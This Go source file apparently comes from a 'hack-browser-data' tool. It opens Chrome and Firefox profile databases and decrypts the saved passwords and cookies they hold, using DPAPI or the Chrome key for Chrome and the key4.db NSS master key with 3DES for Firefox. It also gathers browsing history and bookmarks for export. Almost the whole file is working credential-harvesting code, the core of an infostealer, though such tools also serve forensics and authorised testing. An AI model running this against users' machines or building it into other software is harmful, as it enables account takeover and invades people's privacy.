package common

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"io/ioutil"
	"os"
	"sort"
	"time"

	"hack-browser-data/core/decrypt"
	"hack-browser-data/log"
	"hack-browser-data/utils"

	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
)

const (
	ChromePassword   = "Login Data"
	ChromeHistory    = "History"
	ChromeCookies    = "Cookies"
	ChromeBookmarks  = "Bookmarks"
	FirefoxCookie    = "cookies.sqlite"
	FirefoxKey4DB    = "key4.db"
	FirefoxLoginData = "logins.json"
	FirefoxData      = "places.sqlite"
	FirefoxKey3DB    = "key3.db"
)

var (
	queryChromiumLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
	queryChromiumHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
	queryChromiumCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
	queryFirefoxHistory   = `SELECT id, url, title, last_visit_date, visit_count FROM moz_places`
	queryFirefoxBookMarks = `SELECT id, fk, type, dateAdded, title FROM moz_bookmarks`
	queryFirefoxCookie    = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
	queryMetaData         = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
	queryNssPrivate       = `SELECT a11, a102 from nssPrivate`
	closeJournalMode      = `PRAGMA journal_mode=off`
)

type (
	BrowserData struct {
		Logins
		Bookmarks
		History
		Cookies
	}
	Logins struct {
		logins []loginData
	}
	Bookmarks struct {
		bookmarks []bookmark
	}
	History struct {
		history []history
	}
	Cookies struct {
		cookies map[string][]cookies
	}
)

type (
	loginData struct {
		UserName    string
		encryptPass []byte
		encryptUser []byte
		Password    string
		LoginUrl    string
		CreateDate  time.Time
	}
	bookmark struct {
		ID        int64
		Name      string
		Type      string
		URL       string
		DateAdded time.Time
	}
	cookies struct {
		Host         string
		Path         string
		KeyName      string
		encryptValue []byte
		Value        string
		IsSecure     bool
		IsHTTPOnly   bool
		HasExpire    bool
		IsPersistent bool
		CreateDate   time.Time
		ExpireDate   time.Time
	}
	history struct {
		Title         string
		Url           string
		VisitCount    int
		LastVisitTime time.Time
	}
)

const (
	bookmarkID       = "id"
	bookmarkAdded    = "date_added"
	bookmarkUrl      = "url"
	bookmarkName     = "name"
	bookmarkType     = "type"
	bookmarkChildren = "children"
)

func (b *Bookmarks) ChromeParse(key []byte) error {
	bookmarks, err := utils.ReadFile(ChromeBookmarks)
	if err != nil {
		log.Error(err)
		return err
	}
	r := gjson.Parse(bookmarks)
	if r.Exists() {
		roots := r.Get("roots")
		roots.ForEach(func(key, value gjson.Result) bool {
			getBookmarkChildren(value, b)
			return true
		})
	}
	return nil
}

func (l *Logins) ChromeParse(key []byte) error {
	loginDB, err := sql.Open("sqlite3", ChromePassword)
	if err != nil {
		log.Error(err)
		return err
	}
	defer func() {
		if err := loginDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	err = loginDB.Ping()
	rows, err := loginDB.Query(queryChromiumLogin)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		err = rows.Scan(&url, &username, &pwd, &create)
		login := loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if key == nil {
			password, err = decrypt.DPApi(pwd)
		} else {
			password, err = decrypt.ChromePass(key, pwd)
		}
		if err != nil {
			log.Debugf("%s have empty password %s", login.LoginUrl, err.Error())
		}
		if create > time.Now().Unix() {
			login.CreateDate = utils.TimeEpochFormat(create)
		} else {
			login.CreateDate = utils.TimeStampFormat(create)
		}
		login.Password = string(password)
		l.logins = append(l.logins, login)
	}
	return nil
}

func getBookmarkChildren(value gjson.Result, b *Bookmarks) (children gjson.Result) {
	nodeType := value.Get(bookmarkType)
	bm := bookmark{
		ID:        value.Get(bookmarkID).Int(),
		Name:      value.Get(bookmarkName).String(),
		URL:       value.Get(bookmarkUrl).String(),
		DateAdded: utils.TimeEpochFormat(value.Get(bookmarkAdded).Int()),
	}
	children = value.Get(bookmarkChildren)
	if nodeType.Exists() {
		bm.Type = nodeType.String()
		b.bookmarks = append(b.bookmarks, bm)
		if children.Exists() && children.IsArray() {
			for _, v := range children.Array() {
				children = getBookmarkChildren(v, b)
			}
		}
	}
	return children
}

func (h *History) ChromeParse(key []byte) error {
	historyDB, err := sql.Open("sqlite3", ChromeHistory)
	if err != nil {
		log.Error(err)
		return err
	}
	defer func() {
		if err := historyDB.Close(); err != nil {
			log.Error(err)
		}
	}()
	err = historyDB.Ping()
	rows, err := historyDB.Query(queryChromiumHistory)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)
		err := rows.Scan(&url, &title, &visitCount, &lastVisitTime)
		data := history{
			Url:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeEpochFormat(lastVisitTime),
		}
		if err != nil {
			log.Error(err)
			continue
		}
		h.history = append(h.history, data)
	}
	return nil
}

func (c *Cookies) ChromeParse(secretKey []byte) error {
	c.cookies = make(map[string][]cookies)
	cookieDB, err := sql.Open("sqlite3", ChromeCookies)
	if err != nil {
		log.Debug(err)
		return err
	}
	defer func() {
		if err := cookieDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	err = cookieDB.Ping()
	rows, err := cookieDB.Query(queryChromiumCookie)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			key, host, path                               string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			value, encryptValue                           []byte
		)
		err = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent)
		cookie := cookies{
			KeyName:      key,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     utils.IntToBool(isSecure),
			IsHTTPOnly:   utils.IntToBool(isHTTPOnly),
			HasExpire:    utils.IntToBool(hasExpire),
			IsPersistent: utils.IntToBool(isPersistent),
			CreateDate:   utils.TimeEpochFormat(createDate),
			ExpireDate:   utils.TimeEpochFormat(expireDate),
		}
		// remove prefix 'v10'
		if secretKey == nil {
			value, err = decrypt.DPApi(encryptValue)
		} else {
			value, err = decrypt.ChromePass(secretKey, encryptValue)
		}

		cookie.Value = string(value)
		if _, ok := c.cookies[host]; ok {
			c.cookies[host] = append(c.cookies[host], cookie)
		} else {
			c.cookies[host] = []cookies{cookie}
		}
	}
	return nil
}

func (h *History) FirefoxParse() error {
	var (
		err         error
		keyDB       *sql.DB
		historyRows *sql.Rows
		tempMap     map[int64]string
	)
	tempMap = make(map[int64]string)
	keyDB, err = sql.Open("sqlite3", FirefoxData)
	if err != nil {
		log.Error(err)
		return err
	}
	_, err = keyDB.Exec(closeJournalMode)
	if err != nil {
		log.Error(err)
	}
	defer func() {
		if err := keyDB.Close(); err != nil {
			log.Error(err)
		}
	}()
	historyRows, err = keyDB.Query(queryFirefoxHistory)
	if err != nil {
		log.Error(err)
		return err
	}
	defer func() {
		if err := historyRows.Close(); err != nil {
			log.Error(err)
		}
	}()
	for historyRows.Next() {
		var (
			id, visitDate int64
			url, title    string
			visitCount    int
		)
		err = historyRows.Scan(&id, &url, &title, &visitDate, &visitCount)
		h.history = append(h.history, history{
			Title:         title,
			Url:           url,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeStampFormat(visitDate / 1000000),
		})
		tempMap[id] = url
	}
	return nil
}

func (b *Bookmarks) FirefoxParse() error {
	var (
		err          error
		keyDB        *sql.DB
		bookmarkRows *sql.Rows
		tempMap      map[int64]string
		bookmarkUrl  string
	)
	keyDB, err = sql.Open("sqlite3", FirefoxData)
	if err != nil {
		log.Error(err)
		return err
	}
	_, err = keyDB.Exec(closeJournalMode)
	if err != nil {
		log.Error(err)
	}
	bookmarkRows, err = keyDB.Query(queryFirefoxBookMarks)
	defer func() {
		if err := bookmarkRows.Close(); err != nil {
			log.Error(err)
		}
	}()
	for bookmarkRows.Next() {
		var (
			id, fk, bType, dateAdded int64
			title                    string
		)
		err = bookmarkRows.Scan(&id, &fk, &bType, &dateAdded, &title)
		if url, ok := tempMap[id]; ok {
			bookmarkUrl = url
		}
		b.bookmarks = append(b.bookmarks, bookmark{
			ID:        id,
			Name:      title,
			Type:      utils.BookMarkType(bType),
			URL:       bookmarkUrl,
			DateAdded: utils.TimeStampFormat(dateAdded / 1000000),
		})
	}
	return nil
}

func (b *Bookmarks) Release(filename string) error {
	return os.Remove(filename)
}
func (c *Cookies) Release(filename string) error {
	return os.Remove(filename)
}

func (h *History) Release(filename string) error {
	return os.Remove(filename)
}

func (l *Logins) Release(filename string) error {
	return os.Remove(filename)
}

func (c *Cookies) FirefoxParse() error {
	cookie := cookies{}
	c.cookies = make(map[string][]cookies)
	cookieDB, err := sql.Open("sqlite3", FirefoxCookie)
	if err != nil {
		log.Debug(err)
		return err
	}
	defer func() {
		if err := cookieDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	err = cookieDB.Ping()
	rows, err := cookieDB.Query(queryFirefoxCookie)
	if err != nil {
		log.Error(err)
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			name, value, host, path string
			isSecure, isHttpOnly    int
			creationTime, expiry    int64
		)
		err = rows.Scan(&name, &value, &host, &path, &creationTime, &expiry, &isSecure, &isHttpOnly)
		cookie = cookies{
			KeyName:    name,
			Host:       host,
			Path:       path,
			IsSecure:   utils.IntToBool(isSecure),
			IsHTTPOnly: utils.IntToBool(isHttpOnly),
			CreateDate: utils.TimeStampFormat(creationTime / 1000000),
			ExpireDate: utils.TimeStampFormat(expiry),
		}

		cookie.Value = value
		if _, ok := c.cookies[host]; ok {
			c.cookies[host] = append(c.cookies[host], cookie)
		} else {
			c.cookies[host] = []cookies{cookie}
		}
	}
	return nil
}

func (l *Logins) FirefoxParse() error {
	globalSalt, metaBytes, nssA11, nssA102, err := getDecryptKey()
	if err != nil {
		log.Error(err)
		return err
	}
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	meta, err := decrypt.DecodeMeta(metaBytes)
	if err != nil {
		log.Error("decrypt meta data failed", err)
		return err
	}
	var masterPwd []byte
	m, err := decrypt.Meta(globalSalt, masterPwd, meta)
	if err != nil {
		log.Error("decrypt firefox failed", err)
		return err
	}
	if bytes.Contains(m, []byte("password-check")) {
		log.Debug("password-check success")
		m := bytes.Compare(nssA102, keyLin)
		if m == 0 {
			nss, err := decrypt.DecodeNss(nssA11)
			if err != nil {
				log.Error(err)
				return err
			}
			log.Debug("decrypt asn1 pbe success")
			finallyKey, err := decrypt.Nss(globalSalt, masterPwd, nss)
			finallyKey = finallyKey[:24]
			if err != nil {
				log.Error(err)
				return err
			}
			log.Debug("get firefox finally key success")
			allLogins, err := getLoginData()
			if err != nil {
				return err
			}
			for _, v := range allLogins {
				user, _ := decrypt.DecodeLogin(v.encryptUser)
				pwd, _ := decrypt.DecodeLogin(v.encryptPass)
				u, err := decrypt.Des3Decrypt(finallyKey, user.Iv, user.Encrypted)
				if err != nil {
					log.Error(err)
					return err
				}
				log.Debug("decrypt firefox success")
				p, err := decrypt.Des3Decrypt(finallyKey, pwd.Iv, pwd.Encrypted)
				if err != nil {
					log.Error(err)
					return err
				}
				l.logins = append(l.logins, loginData{
					LoginUrl:   v.LoginUrl,
					UserName:   string(decrypt.PKCS5UnPadding(u)),
					Password:   string(decrypt.PKCS5UnPadding(p)),
					CreateDate: v.CreateDate,
				})

			}
		}
	}
	return nil
}

func getDecryptKey() (item1, item2, a11, a102 []byte, err error) {
	var (
		keyDB   *sql.DB
		pwdRows *sql.Rows
		nssRows *sql.Rows
	)
	keyDB, err = sql.Open("sqlite3", FirefoxKey4DB)
	if err != nil {
		log.Error(err)
		return nil, nil, nil, nil, err
	}
	defer func() {
		if err := keyDB.Close(); err != nil {
			log.Error(err)
		}
	}()

	err = keyDB.Ping()
	pwdRows, err = keyDB.Query(queryMetaData)
	defer func() {
		if err := pwdRows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for pwdRows.Next() {
		if err := pwdRows.Scan(&item1, &item2); err != nil {
			log.Error(err)
			continue
		}
	}
	if err != nil {
		log.Error(err)
	}
	nssRows, err = keyDB.Query(queryNssPrivate)
	defer func() {
		if err := nssRows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for nssRows.Next() {
		if err := nssRows.Scan(&a11, &a102); err != nil {
			log.Debug(err)
		}
	}
	return item1, item2, a11, a102, nil
}

func getLoginData() (l []loginData, err error) {
	s, err := ioutil.ReadFile(FirefoxLoginData)
	if err != nil {
		return nil, err
	}
	h := gjson.GetBytes(s, "logins")
	if h.Exists() {
		for _, v := range h.Array() {
			var (
				m loginData
				u []byte
				p []byte
			)
			m.LoginUrl = v.Get("formSubmitURL").String()
			u, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
			m.encryptUser = u
			if err != nil {
				log.Debug(err)
			}
			p, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
			m.encryptPass = p
			m.CreateDate = utils.TimeStampFormat(v.Get("timeCreated").Int() / 1000)
			l = append(l, m)
		}
	}
	return
}

func (b *BrowserData) Sorted() {
	sort.Slice(b.bookmarks, func(i, j int) bool {
		return b.bookmarks[i].ID < b.bookmarks[j].ID
	})
	sort.Slice(b.history, func(i, j int) bool {
		return b.history[i].VisitCount > b.history[j].VisitCount
	})
	sort.Sort(b.Logins)
}

func (l Logins) Len() int {
	return len(l.logins)
}

func (l Logins) Less(i, j int) bool {
	return l.logins[i].CreateDate.After(l.logins[j].CreateDate)
}

func (l Logins) Swap(i, j int) {
	l.logins[i], l.logins[j] = l.logins[j], l.logins[i]
}

type Formatter interface {
	ChromeParse(key []byte) error
	FirefoxParse() error
	OutPutJson(browser, dir string) error
	OutPutCsv(browser, dir string) error
	Release(filename string) error
}
